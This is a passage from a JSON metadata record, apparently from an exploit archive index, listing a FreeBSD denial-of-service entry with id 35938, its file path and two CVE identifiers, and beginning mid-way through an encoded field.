zZWN1cml0eV9hZHZpc29yaWVzLmFzYy4=", 
    "filename": "platforms/freebsd/dos/35938.txt", 
    "id": "35938", 
    "cves": [
        "CVE-2014-0998", 
        "CVE-2014-8612"
    ]
}